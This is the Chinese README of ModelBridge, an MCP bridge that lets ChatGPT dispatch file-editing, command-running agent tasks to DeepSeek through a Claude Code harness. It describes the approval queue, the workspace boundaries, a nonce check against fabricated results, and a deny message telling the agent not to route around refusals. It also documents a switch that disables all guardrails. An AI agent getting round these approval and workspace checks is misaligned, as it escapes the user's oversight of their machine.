# ModelBridge

给 ChatGPT connector(以及任何 MCP 客户端)配一个**能真正干活的子代理**——读文件、跑命令、多步迭代直到把任务做完。

它出厂时指向 **DeepSeek**,那只是便宜好用的默认值,不是这个项目的重点。设计本身与模型无关:子代理的脑子是你在 `DEEPSEEK_BASE_URL` 里填的那个 Anthropic 兼容端点,外面那层 harness 也是可替换的部件。名字就是从这来的。

[English](README.md) · [更新日志](CHANGELOG.md) · [贡献指南](CONTRIBUTING.md) · [安全策略](SECURITY.md)

---

## 这个插件最大的优势

**它让 ChatGPT 的对话框里多出一个能干活的执行者,而这个执行者的脑子可以是任何模型。**

先把事实说清楚,因为网上对这个项目的转述经常是错的:**ChatGPT 自己的子代理(Luna 等)本来就能干活** —— 它能在你的机器上读写文件、执行命令、多步迭代。这个桥不是在补一个缺失的能力。

真正的约束在别处:**子代理槽位只认 OpenAI 自家模型档位**(Sol / Terra / Luna),外部模型进不去。所以只要你想要一个**别的模型**来干这个活 —— 更快的、更便宜的、或者需要跨厂商独立判断的 —— 唯一的入口是 MCP connector。

而 MCP 工具默认只是个文本接口:调一次,拿一段文字回来。要让一个外部模型真的能干活,得给它配一整套环境。

**关键在于它是怎么做到的:不是把 DeepSeek 接进来,而是给它配了一副手。** 收到 agent 任务时,桥接以子进程方式启动**一整套 agent harness**(Claude Code),把它的端点指向 DeepSeek 的 Anthropic 兼容接口。于是循环、上下文压缩、提示缓存、工具实现这些「让模型真能干活」的部分,用的是现成的、别人在维护的实现,而不是手搓的仿制品。宿主拿到的因此是一个**能自己干活的子代理**,而不是一个问答接口。而且它对外只是**一个 MCP 工具**:任何支持 MCP 的宿主都能调用(ChatGPT / Codex / 其他),ChatGPT connector 只是其中一个入口。harness 这一层是可替换的部件,Claude Code 是它当前的实现,不是这个设计的本体。

| 原生子代理(Luna 等) | 这个插件 |
|---|---|
| 能干完整的活 | 同样干完整的活,**换一个执行者** |
| 模型是 OpenAI 自家档位,槽位换不了 | 模型是 **DeepSeek V4.1 Flash**(552B MoE,约 1M 上下文),改两行 `.env` 就能换 |
| harness 是平台内置的,看不见也改不了 | harness 是 **Claude Code**,一个可替换的部件 |
| 与 Sol 同栈,共享训练偏好 | **外部模型,不带同源偏置**(做安全审查、找反例时才有意义) |

> **关于「更快」,说句实话。** 我自己用下来的体感是两条:**同样的任务,它需要的步数更少,一次做对的概率更高。** 但我**没有做过 benchmark** —— 没拿同一批任务在 Luna 和 DeepSeek 上跑过对照。所以这里写的是实测体感,不是性能数据。而且它未必对所有任务都成立:有社区反馈说非 OpenAI 模型在 `apply_patch` 这类机械编辑子任务上反而更弱。**先小范围试,别整体换。**

**实测的,不是设想的**:给一句「读 `witness.txt`,反转内容,写进 `answer.txt`」,子代理跑了 3 步、2 分 25 秒;磁盘上的 `answer.txt` 与预期字符串**逐字节一致**,旁边还有一个只有真结果才能产生的 nonce。对话自己跟自己一致不算证据——**磁盘上的字节才算**。

*这一条验证的是「它真的会干活」,**不是**「它比 Luna 快」。两者的效率差别目前只有体感,没有对照数据。*

> ⚠️ **这个能力默认关闭。** 不设 `DEEPSEEK_ALLOWED_ROOTS` 时,桥接只能花你的 DeepSeek 额度,碰不到你的电脑。一旦打开,任何拿到 URL 的人都能在你的机器上读写文件、执行命令——**「能执行命令」等于「拿到了你的电脑」**。先读[安全模型](#安全模型)。

**换主模型不影响它。** 桥接不依赖 Sol,也不依赖你当前用哪个档位——它依赖的是「**子代理槽位不对外部模型开放**」这一条,而这条与模型档位无关。要换的只是子代理那侧:改 `.env` 里的 `DEEPSEEK_BASE_URL` 和 `DEEPSEEK_MODEL` 两行,再 `npm run ctl -- reload`(隧道不动,URL 不变)。真正会让这个桥过时的只有一件事:**OpenAI 允许在子代理槽位里挂外部模型**。那是平台级改动,不是模型换代。

---

## 为什么需要它

ChatGPT 的子代理槽位只接受 OpenAI 自家的模型档位(Sol / Terra / Luna),外部模型无法注册成子代理。引入外部模型的唯一入口是 **MCP connector**——把它包成一个主代理可以调用的**工具**。

这意味着一些必须接受的语义变化:

| | ChatGPT 原生子代理 | 本桥接(DeepSeek 作为工具) |
|---|---|---|
| 独立上下文 | 是 | 是(它只看到你传进去的 prompt) |
| 独立性来源 | 独立会话,但同属 OpenAI 栈 | **不同厂商、不同模型,真正独立** |
| 并行 | 是 | 是,通过 agent 任务——`agent_start` 返回 job id,`agent_poll` 取结果 |
| 结果去向 | 留存于独立会话 | 回到调用方上下文 |
| 能否碰你的机器 | 能——但只在宿主自己的沙箱里,碰不到你的文件系统 | **能——在你自己的目录里,只要你给了工作区。** 请先读[安全模型](#安全模型) |
| 成本 | 订阅 credits | 走 DeepSeek API,独立计费(极便宜) |

主要收益是**跨厂商独立复核**。如果你的提示词要求审查者**不得复用**实现者的结论,那么来自不同厂商的模型比同一技术栈的另一档位更符合这条要求——不存在共享的训练血脉去附和。

**换主模型不影响它。** 桥接不依赖 Sol,也不依赖你当前用哪个档位。它依赖的只有一件事:**子代理槽位不对外部模型开放。** 这是平台的属性,不是模型档位的属性——换档位,槽位照样是关的,这个桥就还是唯一的入口。要换的只是子代理那侧:改 `.env` 里的 `DEEPSEEK_BASE_URL` 和 `DEEPSEEK_MODEL` 两行,再 `npm run ctl -- reload`(隧道不动,URL 不变)。真正会让它变得多余的是平台级改动,不是模型换代:**OpenAI 把子代理槽位对外部模型开放。**

> 桥接本身是一个独立的 Node 进程,只与 `api.deepseek.com` 通信,**不运行在** ChatGPT 或任何宿主里;**agent 任务是唯一的例外**——为了跑一个任务,它会以子进程方式启动 [Claude Code](https://claude.com/claude-code),把它的端点指向 DeepSeek 的 Anthropic 兼容接口。桥接从不运行在宿主**内部**,它负责**启动**宿主。

## 架构

```
ChatGPT (Sol) ──HTTPS──▶ Cloudflare 边缘 ──隧道──▶ 本桥接 (127.0.0.1:8787)
                                                          │
   deepseek_flash(task, mode, files) ──▶ 任务注册表 ───────┤──▶ api.deepseek.com ──▶ 文本回来,
   deepseek_agent_start(task, workspace) ──▶ 任务注册表 ───┤   或者一个待轮询的 job id
   deepseek_agent_poll(job_id) ◀─────────────  快照        │   abort · TTL · nonce · 步数/时长上限
                                                          │
                                          harness: claude -p ──▶ api.deepseek.com/anthropic
                                               │  Read / Write / Edit / Bash
                                               │
                                               └─ 审批提示(harness 的 stdio MCP 子进程,
                                                  网络上够不着)──▶ 你,通过 `npm run ctl`
```

工具调用到达那个审批提示之后,按三类分流——这个分法本身就是重点:

| 工具类别 | 规则 |
|---|---|
| **命令**(`Bash`、`PowerShell`) | 预放行的**命令名**无人值守直接跑;其余一律暂停等人工。 |
| **文件工具**(`Read`、`Write`、`Edit`、`NotebookEdit`、`Glob`、`Grep`) | 路径对着该任务的工作区检查。区内无人值守;区外暂停等人工。 |
| **联网工具**(`WebFetch`、`WebSearch`) | 无论工作区是什么,一律人工。 |

中间这一行**不是** `--add-dir` 在管。`--add-dir` 只是**追加**一个可访问目录,它什么都不限制。边界来自把文件工具写进 harness 的 `permissions.ask`——这是在无头模式下唯一能让 `--permission-prompt-tool` 真的被调用的开关(实测过,不是推测)。在这之前,一个工作区是 `D:\项目` 的任务可以直接 `Read C:\Users\你\.env`,连提示都没有。

- **传输**:MCP Streamable HTTP,无状态(`sessionIdGenerator: undefined`,每个请求新建 server + transport,调用方之间不串数据)。但**任务注册表刻意不是每请求一个**——它整个进程只建一次,否则 `start` 一返回,任务就被忘光了。
- **响应以 SSE 流式返回**,而不是缓冲成 JSON。这能让字节持续在链路上流动,避免 Cloudflare 免费版对长 DeepSeek 调用报 **524** 超时。
- **鉴权**:能力 URL。MCP 端点是 `/mcp/<64 位 hex 密钥>`,**路径本身就是凭证**。裸 `/mcp` 和任何错误路径都返回 **404**,与"这里什么都没有"不可区分——因为 ChatGPT 的 connector 表单**没有填 Bearer token 的字段**。
- **两个工具都必须异步**。ChatGPT 单次工具调用的预算约 60 秒,一个真任务不止,推理模型也不止。实测:一次对抗性审查走 `deepseek_flash` 用了 **50 秒**,同一条调用走完整路径见过 **63 秒**。所以两个工具都是阻塞最多 45 秒,超了就返回 job id 让你轮询——你的客户端预算不同就调 `BRIDGE_SYNC_WINDOW_MS`。

## 环境要求

- Node.js **>= 24**(使用原生 TypeScript 类型剥离,无需构建步骤)
- 一个 DeepSeek API key——在 <https://platform.deepseek.com> 申请
- [`cloudflared`](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)(快速隧道用;也可自行部署,见下文)
- **仅 agent 任务需要:**`PATH` 上有 [Claude Code](https://claude.com/claude-code)(或设 `BRIDGE_CLAUDE_BIN`)。一次一答的 `deepseek_flash` 不需要额外依赖,离线测试套件也不需要它和 API key。

## 快速开始

两条路。向导会把该问的都问了、把 `.env` 写好、再顺手把服务和隧道起来；想先逐项看清每个值，就走手动那条。

### 向导（推荐）

```bash
git clone https://github.com/CassiaTw1g/modelbridge.git
cd modelbridge
npm run setup
```

它在**裸仓库上就能跑** —— 不需要先 `npm install`，也不需要有 `.env`，因为这两样都是它负责创建的。把 API key 准备好，粘贴进去就行。

Windows 上也可以直接双击 `windows/0-首次安装.bat`，它做的就是 `npm run setup`。

它问五件事：

| # | 问题 | 答案拿去做什么 |
|---|---|---|
| 1 | 用哪个模型，以及 API key | 写 `DEEPSEEK_API_KEY` / `DEEPSEEK_BASE_URL` / `DEEPSEEK_MODEL`。默认 DeepSeek，任何 Anthropic 兼容端点都行。**key 会先用一个极小的请求验证过才写进去** —— 复制少了字符、或者已经被吊销，在这一步就拦住了，而不是等到 ChatGPT 里调不动才发现。 |
| 2 | 模型跑在哪个 harness 上 | 确认 Claude Code 找得到；不在 `PATH` 上就顺手把路径记进 `.env`。目前只有一个 harness，所以这一步是确认，不是选择。 |
| 3 | 子代理能在哪些目录里工作 | 写 `DEEPSEEK_ALLOWED_ROOTS`。**直接回车 = 一个都不给**，桥保持只读，只能一问一答。填了是**追加**到已有列表，不会覆盖。 |
| 4 | 临时域名还是固定域名 | `quick`（每次启动一个随机 `*.trycloudflare.com`）或 `named`（你自己的域名，connector 只建一次）。选固定会让你粘隧道 token，并提醒你那一步只能在 Cloudflare 网页上做。 |
| 5 | 子代理执行命令前要不要问你 | 默认 `n` 是保留审批；选 `y` 就是下面「安全模型」里写的完全放行。 |

每个答案都是**当场写进 `.env`** 的，所以中途 Ctrl+C 会留下一个能用的文件，重跑接着问就行。最后它会启动服务、开隧道、把 connector 地址复制到剪贴板并打印出来。

语言跟随系统区域设置；要指定就 `npm run setup -- --lang zh` 或 `--lang en`（也可以用 `BRIDGE_LANG`）。

接下来去[注册 connector](#注册-connector)。想确认一切正常，看[验证](#验证)。

### 手动

```bash
git clone https://github.com/CassiaTw1g/modelbridge.git
cd modelbridge
npm install
cp .env.example .env
```

编辑 `.env`：

1. 把 `DEEPSEEK_API_KEY` 填成你的 key。**给这个桥单独申请一个 key**，以便独立撤销；并在 DeepSeek 控制台给它设置消费上限，作为最后一道防线。
2. 生成路径密钥：

   ```bash
   npm run ctl -- secret
   ```

   这会把 `MCP_PATH_SECRET=<随机 hex>` 写进 `.env`（若 `.env` 不存在则直接打印）。

启动服务并开隧道：

```bash
npm run start     # 后台服务，监听 127.0.0.1:8787
npm run tunnel    # cloudflared 快速隧道；打印公网 URL 和完整的 MCP 端点
```

`npm run tunnel` 会打印出可直接填进 ChatGPT 的 URL：

```
公网端点 : https://<random>.trycloudflare.com/mcp/<your-secret>
```

开隧道之前它会先确认本地端口真的在应答。**进程活着 ≠ 服务活着**：`npm start` 外面包了一层 shell，服务启动就崩的时候壳还活着，于是 `ctl status` 报告一切正常；而隧道接到一个没人应答的端口上，给你的就是一个「看起来像 ChatGPT 的问题」的地址。这种情况现在会被直接拒绝，并把日志路径指给你。

### 注册 connector

1. 打开 **ChatGPT 网页版**(桌面端/移动端设置不了 connector)。
2. **Settings → Plugins → MCP → Add server**(备选入口:Settings → Connectors → Advanced → Developer mode)。
3. 类型:**Streamable HTTP**;鉴权:**No authentication**。
4. URL:填**完整**的 `https://<random>.trycloudflare.com/mcp/<your-secret>`——必须包含 `/mcp/<secret>` 路径。只填域名不行。
5. 保存。握手成功的标志是日志出现 `server/discover → initialize → notifications/initialized → tools/list`。

### 告诉主代理什么时候该用它

工具 description 就是路由依据。它写的是**派发条件**,而不仅是工具功能——这能避免调用方随意选择。在你的系统提示词里补一条与你现有子代理规则**互斥**的规则,例如:

> 需要跨厂商独立复核的任务(安全审查、反例构造)→ 调用 `deepseek_flash` 工具,不要派给子代理。需要读写文件、并行协作或与实现者同栈的任务 → 派给子代理。

## 工具参考

两个分组、三个工具。三个都始终注册——但在设置 `DEEPSEEK_ALLOWED_ROOTS` 之前,两个 agent 工具会拒绝一切工作区并返回说明性错误,桥接保持只读。

### `deepseek_flash` —— 一问一答

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `task` | string | 是 | 具体任务。写清目标、约束、期望的输出格式。独立复核场景下**不要在此透露你自己的结论**——那会污染独立性。 |
| `mode` | enum | 否 | `analyze` \| `review` \| `code` \| `summarize`,选择系统提示词。默认 `analyze`。 |
| `files` | string | 否 | 要分析/审查的代码或文本,纯文本透传。**这个工具无法访问你的文件系统**——内容必须贴在这里。另外它受服务端 **2 MB** 请求体上限的约束:模型的上下文窗口约 1M token,但**这条链路能传进去的量不是那个数**。 |

每个 `mode` 有独立的系统提示词。`review` 明确要求模型把材料中作者的结论视为**未经证实的声明**,并显式列出不同意之处——这正是把它路由到外部厂商的意义所在。

阻塞最多 **45 秒**。在这个窗口内跑完的调用,答案照旧直接返回、形态一字不变;更慢的则返回一个 **`job_id`**,答案和别的任务一样用 `deepseek_agent_poll` 取回。DeepSeek 是推理模型——一次审查花 50 秒是正常的,不是故障——所以这件事的差别在于"答案正在路上"和"调用方放弃并报了失败"。

拿到 `job_id` 意味着**此刻还没有答案**。返回的内容里写明了这一点,之后的轮询是拿到答案的唯一途径;此时就向用户报告结论的调用方,那个结论是它自己编的。

### `deepseek_agent_start` —— 派一个需要动手的任务

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `task` | string | 是 | 具体任务。写清目标、约束、期望产出。不要透露你自己的结论。 |
| `workspace` | string | 是 | 允许子代理操作的绝对路径——它以此为根读写文件、执行命令。必须落在 `DEEPSEEK_ALLOWED_ROOTS` 之内,否则调用被拒。 |
| `mode` | enum | 否 | 为兼容保留;当前 harness 不读取该参数。 |

最多阻塞 **45 秒**(ChatGPT 单次工具调用上限约 60 秒)。快任务直接内联返回结果,慢的返回一个 `job_id`。

**调用方挂断不会取消任务。** AbortController 归任务注册表所有,不归 HTTP 请求所有——否则每个等得不耐烦的调用方都会**悄悄杀掉自己刚派出去的任务**。真要停用 `npm run ctl -- job kill <id>`。

### `deepseek_agent_poll` —— 取结果

| 参数 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `job_id` | string | 是 | `deepseek_agent_start` 或 `deepseek_flash` 返回的那个 id。 |
| `wait_seconds` | number | 否 | 阻塞等待秒数,默认 20,上限 40。任务提前结束会立刻返回。 |

一个轮询工具同时服务两类任务,这是有意的。拆成两个的话,调用方得先猜该用哪个,而猜错只会得到一个错误,它对此的唯一应对就是再猜一次。

每个终态结果都带一个建任务时生成的 **nonce**。调用方报结果却报不出这个码,就等于它没有结果——这就是它存在的意义。

### 任务背后跑的是什么

一个任务会启动 Claude Code(`claude -p … --output-format stream-json`),把 `ANTHROPIC_BASE_URL` 指向 `api.deepseek.com/anthropic`。于是**驱动循环的模型是 DeepSeek**,而循环本身、上下文压缩、提示词缓存、工具实现都是 Claude Code 自带的。每个工具事件都被记进任务轨迹,用 `npm run ctl -- jobs <id> --trace` 查看。

## 配置

全部通过 `.env`(已被 gitignore):

| 变量 | 默认值 | 说明 |
|---|---|---|
| `DEEPSEEK_API_KEY` | — | **必填。** 用专用 key,并设消费上限。 |
| `MCP_PATH_SECRET` | — | **必填**,至少 16 字符。能力路径段。`npm run ctl -- secret` 生成 32 字节 hex。 |
| `PORT` | `8787` | 本地监听端口。 |
| `HOST` | `127.0.0.1` | 监听地址。**保持回环**——隧道跑在同一台机器上,把端口暴露到局域网没有任何好处。 |
| `TUNNEL_MODE` | `quick` | `quick` = Cloudflare 快速隧道:零配置,但**每次启动都换一个随机 `*.trycloudflare.com` 域名**,所以 ChatGPT connector 得重建(而且域名被 Cloudflare 回收后会变成 `Unauthorized: Tunnel not found`)。`named` = 在**你自己的域名**上固定下来,见[用自己的域名固定下来](#用自己的域名固定下来)。 |
| `TUNNEL_HOSTNAME` | — | named 模式必填。你的公网主机名,例如 `mcp.example.com`——不带 `https://`,不带路径。它必须已经在 Cloudflare 上,否则控制台配不了路由。 |
| `TUNNEL_TOKEN` | — | named 模式。Cloudflare 控制台为这条隧道签发的凭据。**是一份完整凭据**,与 `MCP_PATH_SECRET` 同级:`ctl` 会遮住它,永不打印、永不提交。别手抄进文件——`npm run ctl -- tunnel named <主机名>` 会问你要并替你写。 |
| `TUNNEL_NAME` | — | named 模式,用来代替 `TUNNEL_TOKEN`:你用 `cloudflared` CLI 创建的隧道名。走这条路时 cloudflared 读它自己的配置和凭据,所以路由规则在**那份配置**里,不在 `TUNNEL_HOSTNAME`——两边要保持一致。 |
| `TUNNEL_PROTOCOL` | *(自动探测)* | cloudflared 连边缘用的传输:`quic`(UDP 7844)或 `http2`(TCP 7844)。留空让它自己探测。**在代理或 TUN 模式梯子后面**请钉成 `quic`——TUN 会吞掉出站 TCP/7844,而 UDP 直通。选错是安静地失败:进程活着、`ctl status` 报"running",但外面够不着,日志反复刷 `TLS handshake with edge error: EOF`。两种隧道模式都适用。 |
| `RATE_LIMIT_PER_MINUTE` | `60` | 滑动窗口,URL 泄漏时限制爆炸半径。**全局一个桶,不是每 IP 的**——服务监听在回环,连进来的只有隧道,所以 `X-Forwarded-For` 是调用方随手写的;信它等于把限流变成"每个假 IP N 次"。只计 `tools/call`:一次轮询可能算三次请求(initialize / tools/list / call),把握手算进去的话,长任务会被自己的轮询打成 429。 |
| `BRIDGE_SYNC_WINDOW_MS` | `45000` | `deepseek_flash` 与 `deepseek_agent_start` 阻塞多久,超过就交回一个 `job_id` 而不是答案。默认值落在 ChatGPT 约 60 秒的工具调用预算之下;你的客户端预算更紧就调小。与 agent 工具是否开启无关,一直生效。 |
| `DEEPSEEK_BASE_URL` | `https://api.deepseek.com` | OpenAI 兼容端点。 |
| `DEEPSEEK_MODEL` | `deepseek-flash` | 模型 ID。 |
| `DEEPSEEK_TIMEOUT_MS` | `180000` | 单次请求 `api.deepseek.com` 的超时;返回结构化错误而不是挂住。不再压在 Cloudflare 100 秒边缘超时以下:超过同步窗口的调用会交回 `job_id`,响应不会被一整次模型调用撑住。 |
| `DEEPSEEK_MAX_OUTPUT_TOKENS` | `16384` | 输出上限。`deepseek-flash` 是推理模型:`reasoning_content` 与 `content` **共享**这个预算,过度推理会挤掉正文。对真实文件做代码审查需要这份余量——`4096` 时光推理就能吃满预算,正文一个字都不剩。 |

### agent 任务

**不设 `DEEPSEEK_ALLOWED_ROOTS` 时,agent 工具拒绝一切工作区,桥接保持只读。** 下面这些只在设了它之后才有意义——请先读[安全模型](#安全模型)。

| 变量 | 默认值 | 说明 |
|---|---|---|
| `DEEPSEEK_ALLOWED_ROOTS` | *(空)* | 允许子代理操作的根目录,用 `;` 分隔。**空 = 拒绝一切**,不是"任意路径"。设了它就等于把机器交出去。用 `npm run ctl -- allow "D:\项目"` 增删——它会写 `.env` 并 reload,隧道和公网 URL 都不动。 |
| `BRIDGE_MAX_STEPS` | `120` | 每个任务的步数上限(一次工具调用 = 一步)。撞上它任务仍然会停,但**已经读到的内容会作为半成品回传**,不是一片空白。它是防失控的刹车,不是工作量指标——把项目通读一遍的审查轻松超过 40 步,然后死在收尾之前。 |
| `BRIDGE_JOB_TIMEOUT_MS` | `1800000` | 墙钟上限(30 分钟)。超时会连同整个子进程树一起结束。`server.ts` 会把注册表自己那道硬墙设成这里 +1 分钟,保证 runner 的超时永远先响——反过来硬墙赢了的话,它会把中止报成一句*已取消*,看不出原因。 |
| `BRIDGE_APPROVAL_TIMEOUT_MS` | `300000` | 一条命令等人工处理多久(5 分钟)。**超时即拒绝。** |
| `BRIDGE_APPROVE_ALLOW` | 见 `DEFAULT_ALLOW` | 逗号分隔的预放行**命令名**——`node` `npm` `git` `dir` `type` 等,加上 PowerShell 的只读 cmdlet。**只比对第一个词**,约束的是"哪个程序",不是它的参数。名单外的一律暂停等人工。注意它只管**命令**:工作区外的文件读写、以及任何联网工具,无论名单里有什么,都必须人工批准。 |
| `BRIDGE_CC_APPROVAL` | 开 | 设为 `off` 会整个跳过审批队列。⚠️ 它拿掉的比"不再询问"更多:子进程 `approval-mcp.ts` **根本不会启动**,命令允许名单、链式命令护栏、文件工具的工作区边界**一起消失**。⚠️ 它**不随重启复位**,所以不适合当日常开关——要临时放行请用 `npm run auto:on`,下次重启会自动收回。保持注释状态;只有 `npm run accept` 会显式覆盖它。 |
| `BRIDGE_CLAUDE_BIN` | `PATH` 上的 `claude` | Claude Code 可执行文件路径。 |
| `BRIDGE_ANTHROPIC_BASE_URL` | `$DEEPSEEK_BASE_URL/anthropic` | harness 把请求发到哪里。 |
| `BRIDGE_STATE_DIR` | `<项目目录>/.state` | 任务快照、审批队列、审计日志的位置。 |
| `BRIDGE_WORKSPACE` | *(自动注入)* | 由 harness 按任务注入,一个任务一个值——审批服务靠它知道自己在守哪条边界。**不要手工设置。** |
| `BRIDGE_CC_MAX_BUDGET_USD` | *(未设)* | 可选的 harness `--max-budget-usd`。默认关掉**是因为 Claude Code 按 Claude 的价格计费**——这里设的限额读数约等于真实 DeepSeek 花费的 100 倍,会把任务提前掐断。 |

## 生命周期命令

```bash
npm run setup      # 首次安装向导(见「快速开始」)
npm run start      # 后台启动(已运行则无操作)
npm run stop       # 停止服务和隧道
npm run restart    # 重启服务(会一并停掉隧道,需重新 tunnel)
npm run status     # 启用状态、PID、本地与公网端点
npm run logs       # 最近 40 行日志
npm run url        # 把完整 connector 地址复制到剪贴板并打印出来
npm run tunnel     # 启动 Cloudflare 隧道并打印公网 URL
npm run untunnel   # 只停隧道
npm run auto       # 查看当前审批模式
npm run auto:on    # 完全放行(详见"安全模型")
npm run auto:off   # 恢复"需要批准"
npm run enable     # 清除 disabled 标志
npm run disable    # 停止一切并设置 disabled 标志
npm run uninstall  # 停止并清除本地状态(保留项目目录)
```

`npm run start --foreground` 前台运行,便于调试。

`npm run setup` 可以重复跑:它会把每一项重新问一遍并覆盖答案。只有工作区目录那一项是**追加**而不是覆盖的 ——
所以重跑不会把你用 `npm run ctl -- allow` 加过的目录悄悄抹掉。

重建 ChatGPT connector 时用 `npm run url`:它打印 `https://<域名>/mcp/<密钥>`,并把同一串
放进剪贴板,不用再从 `npm run status --show` 的输出里用鼠标划选那一长串密钥。

### 轮换路径密钥

```bash
npm run ctl -- rotate
```

生成新密钥、**只重启服务**、打印新的公网 URL —— 同时把它复制到剪贴板。隧道是故意不动的:它只负责转发端口,根本不知道路径是什么,所以公网域名保持不变,只有 URL 最后一段会变。(用 `npm run restart` 会连隧道一起停掉,代价是换一个新域名、还要再跑一趟 connector。)

只要 URL 有可能被别人看到过就轮换一次。它是你的电脑和"拿到这个 URL 的人"之间唯一的东西。

Windows 上双击 `windows/7-轮换密钥.bat` 效果相同。想自己控制的话,`npm run ctl -- secret` 只写密钥、不重启任何东西 —— 之后你得手动重启并更新 connector。

工作区白名单是同一套做法:双击 `windows/8-添加项目目录.bat`,它问你要一个路径,然后运行 `npm run ctl -- allow "<目录>"` —— 写 `.env` 并 reload,隧道不动。路径记得加引号或用正斜杠:在 POSIX shell 里直接敲 `D:\codex\3`,反斜杠会被吃掉。

### 密钥默认不再打印

`npm run ctl -- status / start / tunnel / secret` 会把端点里的密钥显示成 `<密钥已隐藏>`。加 `--show` 才打印完整的。理由是每打印一份就多一处留存:终端滚动历史、shell 转录、粘到别处的排障记录。这个项目至今唯一一次真实泄漏,就是 `ctl` 自己打出来的,不是被人找出来的。`rotate` 仍然把**完整** URL 放进剪贴板——剪贴板不是日志。

### 改了代码或 `.env` 之后

```bash
npm run ctl -- reload
```

只重启服务。隧道不动,所以**公网 URL 完全不变**,ChatGPT 那边什么都不用做。`restart` 会连隧道一起停——那是另一个命令,给另一种情况用。

### 为什么你得重建 connector,以及怎么不用再重建

这不是你没找到按钮。**ChatGPT 的 connector 表单可能根本没有「改 URL」这个动作**——文档给的做法就是删掉再加一次。(界面随账号和版本变,先自己找一下有没有编辑入口,找一下不花成本。)而且本桥接默认走 Cloudflare **quick tunnel**,它在**每次启动时都会分到一个新的随机域名**——所以只要隧道重启过,URL 就变了,你就得重建一次。

三条路:

| 做法 | 代价 | 效果 |
|---|---|---|
| **什么都不做** | 零 | 日常通常够了。`reload` 不动隧道,`ctl` 也不再打印密钥,所以正常使用下 URL 不会变。只有你**主动轮换密钥**时才需要重建一次 connector。 |
| **换成域名固定的隧道** | 必须**自己拥有一个域名**,且 NS 已指向 Cloudflare | URL 的域名部分**永久不变**,本桥接已内置,见下。 |
| **第三方固定域名隧道** | 装一个软件、注册一个账号 | 效果同上。[Tailscale Funnel](https://tailscale.com/kb/1223/funnel) 不用买域名:个人使用免费,给你 `https://<机器名>.<你的网络>.ts.net`。*本条尚未在本桥接上实测。* |

先从第一行开始。只有当"偶尔重建一次"仍然让你难受时,再往下走。

#### 用自己的域名固定下来

快速隧道之所以是默认,是因为它零配置。如果你有一个域名、且它的 NS 已经指向 Cloudflare,就能拿到一个**重启、重开机、`restart` 之后都不变**的地址——connector 建一次,以后再也不用碰。

三步里有两步在 Cloudflare 控制台上、只有你能做。**先建隧道**:`Networking → Tunnels → Create a tunnel`(老教程里写的 `Zero Trust → Networks → Connectors` 现在跳到同一个页面);**再加路由**,在该隧道的 `Routes(路由)` 标签下:

```
Networking → Tunnels → 这条隧道 → Routes(路由) → Add route
  → Published application(已发布的应用)
  子域名(Subdomain) : mcp
  域(Domain)        : 你的域名
  Service 类型      : HTTP
  Service URL       : http://localhost:8787
```

DNS 记录和证书 Cloudflare 会自己建,**不要再手工加一条**。然后把页面上那串很长的 token 复制下来,回本机:

```bash
npm run ctl -- tunnel named mcp.example.com
```

它会问你要隧道 token(粘进去就行,**别手抄进文件**),替你写好 `.env`。Windows 上双击 `windows/11-固定域名.bat` 是同一件事:它把控制台那几步打出来,问你要域名和 token,并在你确认路由已存好后问要不要当场切过去。

⚠️ **漏掉加路由这一步就是那个坑。** 漏了的话,隧道会报"已连上边缘"、本机看着一切正常,但打开那个域名是 404——因为"域名 → 本地端口"这条路由在 Cloudflare **云端**,不在本机。`npm run ctl -- tunnel check` 会把你还没做的部分列出来,而且把"已注册到边缘"和"域名真的能应答"**分开报**,因为那是两件不同的事实。修它**本机一个字都不用改**:把那条 route 补上,立刻就通。

代码和文档里没有任何人的真实域名,值全部来自你自己的 `.env`。`TUNNEL_TOKEN` 和路径密钥同级,是一份完整凭据——它永远不会被打印,`ctl` 会遮住它。

> **不要用 ngrok 免费版。** 它会插一个浏览器警告页,需要 `ngrok-skip-browser-warning` 请求头才能跳过,而 ChatGPT connector 无法自定义请求头——连接会直接被掐断。

### agent 任务与审批命令

这些命令读的是服务写下的文件,所以在**另一个终端**里跑就行——而且即使服务在"请求发出"和"你答复"之间重启过,它们照样有效。

```bash
npm run ctl -- jobs                # 所有任务:状态 / 步数 / 耗时 / 验证码
npm run ctl -- jobs <id> --trace   # 完整轨迹:第几步调了什么工具
npm run ctl -- job kill <id>       # 取消一个运行中的任务(连同子进程树)
npm run ctl -- pending             # 正在等你批准的命令,附完整原文
npm run ctl -- approve <id>        # 放行
npm run ctl -- deny <id>           # 拒绝——模型会收到原因,并被明确告知不要绕路
npm run ctl -- audit               # 最近的审批记录(--all 看全部)
```

## 验证

四层,从最便宜的开始。

**1. 离线段——不需要网络、不需要 key、不花钱:**

```bash
npm test
```

| 套件 | 守住什么 |
|---|---|
| `test:loop` | 响应解析与请求计数。一个工具回合**不得**被发两次;`reasoning_content` 必须活着回到下一个请求,否则 API 直接 400。 |
| `test:sandbox` | 路径逃逸回归:UNC、`\\?\`、NTFS 备用数据流、保留设备名、尾随点、前缀边界、junction。Windows 专有项在别的平台自动跳过;硬链接缺口被断言为**成功**,而不是假装它不存在。 |
| `test:approvals` | 审批协议:自动放行规则、串联命令的拒绝,以及**所有非人工出口——超时、被取消、决定文件损坏——一律归为拒绝**。 |
| `test:guard` | 文件工具的工作区边界:区内路径放行;区外路径、父级回溯、前缀相同的兄弟目录、UNC 与备用数据流一律转人工;`Grep` 的正则不被误判成路径。断言 Win32 路径语义的那几条在非 Windows 上自动跳过,理由和 `test:sandbox` 一样。 |
| `test:jobs` | 任务注册表。最要紧的一条:**客户端断线不得杀掉任务**——因为 MCP SDK 会在客户端挂断时 abort 当前请求处理器。 |
| `selftest:memory` | 内存内 MCP 往返;agent 工具已注册,且越界工作区会被拒。 |

**2. 公网端点冒烟测试——走真实 HTTP 链路:**

```bash
npm run smoke                          # 从 .state/tunnel.log 读隧道 URL
npm run smoke -- https://host/mcp/xxx  # 或显式传入端点
```

它断言:健康检查正常、裸 `/mcp` 返回 404、错误密钥返回 404、真实 `tools/call` 返回非空内容。它用 Node 的 `fetch`,**不是 `curl`**——原因见下面的 Windows 说明。

**3. 验收——子代理到底有没有干活的能力?**(在线,花一点点钱)

```bash
npm run accept           # 三个任务全跑
npm run accept -- --only B
```

三个**只会聊天的模型不可能通过**的任务:

| | 任务 | 通过意味着 |
|---|---|---|
| **A** | 把只存在于文件里的 32 位随机串反转后复现出来 | 它真的读了文件——除此之外没有任何办法得到那个串 |
